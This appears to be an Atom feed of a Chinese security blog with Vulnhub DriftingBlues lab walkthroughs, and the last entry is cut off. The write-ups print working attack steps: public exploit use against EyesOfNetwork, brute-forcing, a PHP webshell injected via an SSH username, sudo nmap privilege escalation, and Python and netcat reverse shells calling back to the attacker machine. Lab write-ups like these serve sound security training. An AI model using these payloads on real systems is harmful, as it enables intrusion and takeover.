<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Aesm1p&#39;s Blog</title>
  
  <subtitle>前方如聂鲁达的爱情诗一般美好</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://chaosec.top/"/>
  <updated>2021-06-21T12:27:31.727Z</updated>
  <id>http://chaosec.top/</id>
  
  <author>
    <name>Aesm1p</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Vulnhub系列-Driftingblues7</title>
    <link href="http://chaosec.top/2021/06/20/vulnhubDriftingblues7/"/>
    <id>http://chaosec.top/2021/06/20/vulnhubDriftingblues7/</id>
    <published>2021-06-20T00:23:22.000Z</published>
    <updated>2021-06-21T12:27:31.727Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2021/06/20/vulnhubDriftingblues7/3.jpg" alt></p><a id="more"></a><p><strong>端口扫描</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -sV -p- -vv -A -oA nmap 192.168.56.113</span><br></pre></td></tr></table></figure><p>开放了多个端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Discovered open port 3306&#x2F;tcp on 192.168.56.113</span><br><span class="line">Discovered open port 111&#x2F;tcp on 192.168.56.113</span><br><span class="line">Discovered open port 443&#x2F;tcp on 192.168.56.113</span><br><span class="line">Discovered open port 22&#x2F;tcp on 192.168.56.113</span><br><span class="line">Discovered open port 80&#x2F;tcp on 192.168.56.113</span><br><span class="line">Discovered open port 2403&#x2F;tcp on 192.168.56.113</span><br><span class="line">Discovered open port 8086&#x2F;tcp on 192.168.56.113</span><br><span class="line">Discovered open port 66&#x2F;tcp on 192.168.56.113</span><br></pre></td></tr></table></figure><p>经过测试66端口的服务没什么利用价值，所以寻找其他服务</p><p><strong>3306端口</strong></p><p>3306端口无法远程连接</p><p><strong>66端口</strong></p><p>一个http服务，但是没有找到什么有价值的内容，尝试一下目录扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;192.168.56.113:66&#x2F; -x php,txt,html -t 40 -w &#x2F;opt&#x2F;SecLists&#x2F;Discovery&#x2F;Web-Content&#x2F;directory-list-2.3-medium.txt --no-error</span><br></pre></td></tr></table></figure><p>结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;flag.txt             (Status: 200) [Size: 1823]</span><br><span class="line">&#x2F;index_files          (Status: 301) [Size: 0] [--&gt; &#x2F;index_files&#x2F;]</span><br></pre></td></tr></table></figure><p>访问flag.txt可以看到flag，但是应该是个假flag</p><p><strong>80端口</strong></p><p>进行一下目录扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u https:&#x2F;&#x2F;192.168.56.113&#x2F; -k -x php,txt,html -t 40 -w &#x2F;opt&#x2F;SecLists&#x2F;Discovery&#x2F;Web-Content&#x2F;directory-list-2.3-medium.txt -b 302,404,301,500</span><br></pre></td></tr></table></figure><p>没有扫到什么有效的目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;login.php</span><br><span class="line">&#x2F;header.php</span><br><span class="line">&#x2F;logout.php</span><br></pre></td></tr></table></figure><p>发现80端口部署了eyes of works，搜索相应的漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~&#x2F;Desktop&#x2F;driftingblues7]</span><br><span class="line">└─$ searchsploit eyes of network</span><br><span class="line">-------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                        |  Path</span><br><span class="line">-------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">EyesOfNetwork (EON) 5.0 - Remote Code Execution                                       | php&#x2F;webapps&#x2F;41746.md</span><br><span class="line">EyesOfNetwork (EON) 5.0 - SQL Injection                                               | php&#x2F;webapps&#x2F;41747.md</span><br><span class="line">EyesOfNetwork (EON) 5.1 - SQL Injection                                               | php&#x2F;webapps&#x2F;41774.py</span><br><span class="line">EyesOfNetwork - AutoDiscovery Target Command Execution (Metasploit)                   | multiple&#x2F;remote&#x2F;48169.rb</span><br><span class="line">EyesOfNetwork 5.1 - Authenticated Remote Command Execution                            | php&#x2F;webapps&#x2F;47280.py</span><br><span class="line">EyesOfNetwork 5.3 - File Upload Remote Code Execution                                 | multiple&#x2F;webapps&#x2F;49432.sh</span><br><span class="line">EyesOfNetwork 5.3 - LFI                                                               | multiple&#x2F;webapps&#x2F;49404.txt</span><br><span class="line">EyesOfNetwork 5.3 - RCE &amp; PrivEsc                                                     | multiple&#x2F;webapps&#x2F;49402.txt</span><br><span class="line">EyesOfNetwork 5.3 - Remote Code Execution                                             | php&#x2F;webapps&#x2F;48025.txt</span><br><span class="line">-------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure><p>使用48025.txt可以创建出新的管理员用户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;webapps&#x2F;48025.txt https:&#x2F;&#x2F;192.168.56.113 -ip 127.0.0.1 -port 8888 -user snow</span><br></pre></td></tr></table></figure><p>用户名和密码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snow:net_was_here</span><br></pre></td></tr></table></figure><p>使用该超级管理员账号登录，然后访问autodiscovery.php文件可以通过nmap进行getshell</p><p><img src="/2021/06/20/vulnhubDriftingblues7/1.png" alt></p><p>在本地监听8888端口，然后执行该扫描即可得到反弹的shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~&#x2F;Desktop&#x2F;driftingblues7]</span><br><span class="line">└─$ nc -lvvp 8888</span><br><span class="line">listening on [any] 8888 ...</span><br><span class="line">192.168.56.113: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.56.108] from (UNKNOWN) [192.168.56.113] 38132</span><br><span class="line">ls</span><br><span class="line">autodiscover.php</span><br><span class="line">classes.inc.php</span><br><span class="line">engines</span><br><span class="line">whoami</span><br><span class="line">apache</span><br></pre></td></tr></table></figure><p>此时是apache用户，该用户可以在不使用密码的情况下通过sudo执行nmap命令从而提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;os.execute(&quot;&#x2F;bin&#x2F;sh&quot;)&#39; &gt; &#x2F;tmp&#x2F;nmap.script</span><br><span class="line">sudo nmap --script&#x3D;&#x2F;tmp&#x2F;nmap.script</span><br></pre></td></tr></table></figure><p>此时即可获得root权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">cd &#x2F;root</span><br><span class="line">ls</span><br><span class="line">anaconda-ks.cfg</span><br><span class="line">eon</span><br><span class="line">flag.txt</span><br><span class="line">index.htm</span><br><span class="line">index_files</span><br><span class="line">logdel2</span><br><span class="line">upit.sh</span><br><span class="line">cat flag.txt</span><br><span class="line">flag 1&#x2F;1</span><br></pre></td></tr></table></figure><p>登录之后查看sudoers文件可以看到与我们所想一致</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># eonweb</span><br><span class="line">apache ALL&#x3D;NOPASSWD:&#x2F;bin&#x2F;systemctl * snmptt,&#x2F;bin&#x2F;systemctl * snmptrapd,&#x2F;bin&#x2F;systemctl * snmpd,&#x2F;bin&#x2F;systemctl * nagios,&#x2F;bin&#x2F;systemctl * gedd,&#x2F;usr&#x2F;bin&#x2F;nmap</span><br></pre></td></tr></table></figure><p><strong>111端口</strong></p><p>开启的是一个rpcbind服务，暂没找到利用思路</p><p><strong>443</strong></p><p>https服务，80端口会跳转到该https网站</p><p><strong>2403</strong></p><p>部署的是一个taskmaster服务</p><p><strong>8086</strong></p><p>部署的是一个InfluxDB http admin服务</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>要加强公开CVE的利用能力</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/2021/06/20/vulnhubDriftingblues7/3.jpg&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="vulnhub" scheme="http://chaosec.top/categories/vulnhub/"/>
    
    
      <category term="cve" scheme="http://chaosec.top/tags/cve/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub系列-Driftingblues5</title>
    <link href="http://chaosec.top/2021/06/13/vulnhubDriftingblues5/"/>
    <id>http://chaosec.top/2021/06/13/vulnhubDriftingblues5/</id>
    <published>2021-06-13T12:23:22.000Z</published>
    <updated>2021-06-14T09:45:10.621Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2021/06/13/vulnhubDriftingblues5/1.jpg" alt></p><a id="more"></a><h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -sV -p- -vv -A -oA namp 192.168.56.112</span><br></pre></td></tr></table></figure><p>80和22端口开放，80端口跑的似乎是wordpress服务</p><h1 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h1><p>尝试登录后台发现在登录的时候用户名和密码的错误提示不同，我们可以利用这个特性来进行爆破，网站有很多评论，提取出这个回复的用户名去网站后台进行登录测试，可以得到可用账号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">collins</span><br><span class="line">gill</span><br><span class="line">satanic</span><br><span class="line">gadd</span><br></pre></td></tr></table></figure><p>使用此密码进行爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url 192.168.56.112&#x2F; --usernames usernames --passwords &#x2F;opt&#x2F;SecLists&#x2F;Passwords&#x2F;Common-Credentials&#x2F;10k-most-common.txt</span><br></pre></td></tr></table></figure><p>结果没有爆破出来，试了其它也没有什么思路，感觉还是这个作为突破点，使用cewl生成字典再次进行爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cewl http:&#x2F;&#x2F;192.168.56.112&#x2F; -w password.txt</span><br><span class="line">wpscan --url 192.168.56.112&#x2F; --usernames usernames --passwords password.txt</span><br></pre></td></tr></table></figure><p>爆破得到密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gill &#x2F; interchangeable</span><br></pre></td></tr></table></figure><p>登录网站之后找图片，在media中发现有一张图片是unattached状态，将该图片下载下来使用strings命令可以看到ssh的密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gill:59583hello</span><br></pre></td></tr></table></figure><p>使用ssh登录，登录之后在家目录下有一个keepass文档，将该文件转换为哈希文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keepass2john &#x2F;tmp&#x2F;keyfile.kdbx &gt; keepass.txt</span><br></pre></td></tr></table></figure><p>接下来就是爆破密码了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13400 -a 0 -w 1 keepass.txt  &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br></pre></td></tr></table></figure><p>对应的密码为<code>porsiempre</code>，这是keepass的master密码，用keepass工具带入keyfile文件</p><p><img src="/2021/06/13/vulnhubDriftingblues5/1.png" alt></p><p>使用pspy进行进程监控，可以看到会运行一个定时任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2021&#x2F;06&#x2F;12 10:15:01 CMD: UID&#x3D;0    PID&#x3D;3896   | &#x2F;bin&#x2F;sh -c &#x2F;root&#x2F;key.sh</span><br></pre></td></tr></table></figure><p>这个文件没有权限可以修改，在根目录下有个keyfolder文件夹，我们将keepass解出来的标题对应的文件名写入该文件夹下，一个一个试，如果文件名正确，等一分钟左右就会在文件夹下多出一个文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-rw-r--r--  1 gill gill    5 Jun 12 11:12 fracturedocean</span><br><span class="line">-rw-r--r--  1 root root   29 Jun 12 11:16 rootcreds.txt</span><br></pre></td></tr></table></figure><p>查看该文件即可获取密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gill@driftingblues:~# cat &#x2F;keyfolder&#x2F;rootcreds.txt</span><br><span class="line">root creds</span><br><span class="line"></span><br><span class="line">imjustdrifting31</span><br></pre></td></tr></table></figure><p>登录即可获取flag2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@driftingblues:~# cat root.txt</span><br><span class="line">flag 2&#x2F;2</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>总体来说，这个靶机感觉很需要脑洞，一堆字典爆破。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/2021/06/13/vulnhubDriftingblues5/1.jpg&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="vulnhub" scheme="http://chaosec.top/categories/vulnhub/"/>
    
    
      <category term="bruteForce" scheme="http://chaosec.top/tags/bruteForce/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub系列-Driftingblues4</title>
    <link href="http://chaosec.top/2021/06/12/vulnhubDriftingblues4/"/>
    <id>http://chaosec.top/2021/06/12/vulnhubDriftingblues4/</id>
    <published>2021-06-12T12:23:22.000Z</published>
    <updated>2021-06-13T06:25:34.885Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2021/06/12/vulnhubDriftingblues4/1.jpeg" alt></p><a id="more"></a><h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -sT -sV -A -oA nmap -vv 192.168.56.111</span><br></pre></td></tr></table></figure><p>开放端口为21,22，80端口</p><p><strong>21</strong>端口</p><p>21端口尝试匿名登录没什么收获</p><p><strong>80端口</strong></p><p>查看源代码，可以看到一段base64密文，该密文多层base64加密，最终解密之后如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">go back intruder!!! </span><br><span class="line">tight security drippin </span><br><span class="line">i hope you&#39;re an employee</span><br><span class="line">&#x2F;imfuckingmad.txt</span><br></pre></td></tr></table></figure><p>访问/imfuckingmad.txt页面，是一段brainfuck编码的字符，解码一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">man we are a tech company and still getting hacked??? what the shit??? enough is enough!!! </span><br><span class="line">#</span><br><span class="line">##</span><br><span class="line">...</span><br><span class="line">#</span><br><span class="line">&#x2F;iTiS3Cr3TbiTCh.png</span><br></pre></td></tr></table></figure><p>访问该图片发现是一个二维码，指向一个网址，是一张图片</p><p><img src="/2021/06/12/vulnhubDriftingblues4/1.png" alt></p><p>给了一些用户名，收集信息发现ssh只支持公钥登录，那么就只能在ftp上使用了，所以我们进行密码爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l luther -P &#x2F;opt&#x2F;SecLists&#x2F;Passwords&#x2F;Common-Credentials&#x2F;common-passwords-win.txt 192.168.56.111 ftp</span><br></pre></td></tr></table></figure><p>但是爆破失败，无奈动用更大字典</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P &#x2F;opt&#x2F;SecLists&#x2F;Passwords&#x2F;Common-Credentials&#x2F;best1050.txt 192.168.56.111 ftp</span><br></pre></td></tr></table></figure><p>终于成功！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[21][ftp] host: 192.168.56.111   login: hubert   password: john316</span><br></pre></td></tr></table></figure><p>使用此账号登录ftp</p><p>登录之后啥也没有，只是有一个hubert的空目录，猜测该目录即为hubert用户的家目录，所以我们可以向该目录上传一个公钥从而使用公钥远程ssh登录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> <span class="built_in">cd</span> hubert</span></span><br><span class="line">250 CWD command successful</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> mkdir .ssh</span></span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> put authorized_keys</span></span><br></pre></td></tr></table></figure><p>然后ssh登录，可以看到第一段flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hubert@driftingblues:~$ id</span><br><span class="line">uid&#x3D;1001(hubert) gid&#x3D;1001(hubert) groups&#x3D;1001(hubert)</span><br><span class="line">hubert@driftingblues:~$ ls</span><br><span class="line">emergency.py  user.txt</span><br><span class="line">hubert@driftingblues:~$ cat user.txt</span><br><span class="line">flag 1&#x2F;2</span><br></pre></td></tr></table></figure><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>查看家目录下的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">hubert@driftingblues:~$ ls -al</span><br><span class="line">total 32</span><br><span class="line">drwx------ 4 hubert hubert 4096 Jun  7 10:09 .</span><br><span class="line">drwxr-xr-x 4 root   root   4096 Jan  9 13:44 ..</span><br><span class="line">-rwx------ 1 hubert hubert    1 Jun  7 10:09 .bash_history</span><br><span class="line">-rwx------ 1 hubert hubert    1 Jun  7 10:09 .bashrc</span><br><span class="line">-rwxr-xr-x 1 root   root    217 Jan  9 13:43 emergency.py</span><br><span class="line">drwx------ 3 hubert hubert 4096 Jun  7 10:05 .gnupg</span><br><span class="line">drwx------ 2 hubert hubert 4096 Jun  7 10:05 .ssh</span><br><span class="line">-rwx------ 1 hubert hubert 1805 Jan  3 11:56 user.txt</span><br></pre></td></tr></table></figure><p>可以看到存在一个emergency.py的属于root的文件，应该可以用来提权，文件内容如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">'echo 1 &gt;&gt; /tmp/backdoor_testing'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># template python script for backdoor purposes</span></span><br><span class="line"><span class="comment"># i'm gonna leave it with loose permissions</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># say africa without a's</span></span><br></pre></td></tr></table></figure><p>进行进程监控发现该python文件会被定时执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2021&#x2F;06&#x2F;07 10:14:01 CMD: UID&#x3D;0    PID&#x3D;4826   | python &#x2F;home&#x2F;hubert&#x2F;emergency.py</span><br></pre></td></tr></table></figure><p>之前我看到755以为不能删除文件，但是其实是可以删除的，那么就简单了，我们删除改文件然后在新建一个同名的反弹shell的python代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"192.168.56.108"</span>,<span class="number">8080</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>]);</span><br></pre></td></tr></table></figure><p>也可以通过nc命令提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e &#x2F;bin&#x2F;bash 192.168.56.108 8080</span><br></pre></td></tr></table></figure><p>然后再kali上监听端口即可getshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nc -lvvp 8080                                                                                                   1 ⨯</span><br><span class="line">listening on [any] 8080 ...</span><br><span class="line">192.168.56.111: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.108] from (UNKNOWN) [192.168.56.111] 34826</span><br><span class="line">&#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off</span><br><span class="line"># id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line"># ls &#x2F;root</span><br><span class="line">root.txt</span><br><span class="line">sync</span><br><span class="line"># cat &#x2F;root&#x2F;root.txt</span><br><span class="line">flag 2&#x2F;2</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/2021/06/12/vulnhubDriftingblues4/1.jpeg&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="vulnhub" scheme="http://chaosec.top/categories/vulnhub/"/>
    
    
      <category term="bruteForce" scheme="http://chaosec.top/tags/bruteForce/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub系列-Draftingblues3</title>
    <link href="http://chaosec.top/2021/06/03/vulnhubDraftingblues3/"/>
    <id>http://chaosec.top/2021/06/03/vulnhubDraftingblues3/</id>
    <published>2021-06-03T12:23:22.000Z</published>
    <updated>2021-06-05T13:59:00.937Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2021/06/03/vulnhubDraftingblues3/2.png" alt></p><a id="more"></a><p>扫描端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -sT -sV -A -oA nmap -vv 192.168.56.110</span><br></pre></td></tr></table></figure><p>开放80和22端口</p><p>80端口访问robots.txt可以得到路径提示，访问<code>/eventadmins</code>路径，得到提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">man there&#39;s a problem with ssh</span><br><span class="line"></span><br><span class="line">john said &quot;it&#39;s poisonous!!! stay away!!!&quot;</span><br><span class="line"></span><br><span class="line">idk if he&#39;s mentally challenged</span><br><span class="line"></span><br><span class="line">please find and fix it</span><br><span class="line"></span><br><span class="line">also check &#x2F;littlequeenofspades.html</span><br><span class="line"></span><br><span class="line">your buddy, buddyG</span><br></pre></td></tr></table></figure><p>可以看到还有一个页面<code>/littlequeenofspades.html</code>，访问该页面，然后此时需要开脑洞查看一下源代码，可以看到一段base64</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~&#x2F;draftingblue3]</span><br><span class="line">└─$ echo &#39;aW50cnVkZXI&#x2F;IEwyRmtiV2x1YzJacGVHbDBMbkJvY0E9PQ&#x3D;&#x3D;&#39;|base64 -d</span><br><span class="line">intruder? L2FkbWluc2ZpeGl0LnBocA&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~&#x2F;draftingblue3]</span><br><span class="line">└─$ echo &#39;L2FkbWluc2ZpeGl0LnBocA&#x3D;&#x3D;&#39;|base64 -d</span><br><span class="line">&#x2F;adminsfixit.php</span><br></pre></td></tr></table></figure><p>访问/adminsfixit.php页面，该页面会记录登录记录，所以我们可以通过登录名来构造php木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh &#39;&lt;?php @eval($_POST[123]);?&gt;&#39;@192.168.56.110</span><br></pre></td></tr></table></figure><p>然后蚁剑连接即可，发现robertj用户.ssh非属主用户可读可写可执行，所以上传公钥到服务器然后即可登录</p><p><img src="/2021/06/03/vulnhubDraftingblues3/1.png" alt></p><p>登录之后查看user.txt可以得到第一段flag</p><p>查看id可以发现该用户存在一个奇怪的用户组operators</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">robertj@driftingblues:&#x2F;tmp$ id</span><br><span class="line">uid&#x3D;1000(robertj) gid&#x3D;1000(robertj) groups&#x3D;1000(robertj),1001(operators)</span><br><span class="line">robertj@driftingblues:&#x2F;tmp$ ls -l &#x2F;usr&#x2F;bin&#x2F;getinfo</span><br><span class="line">-r-sr-s--- 1 root operators 16704 Jan  4 11:05 &#x2F;usr&#x2F;bin&#x2F;getinfo</span><br></pre></td></tr></table></figure><p>查看属于该用户组的suid权限的文件</p><figure class="highlight plain"><table><tr><td 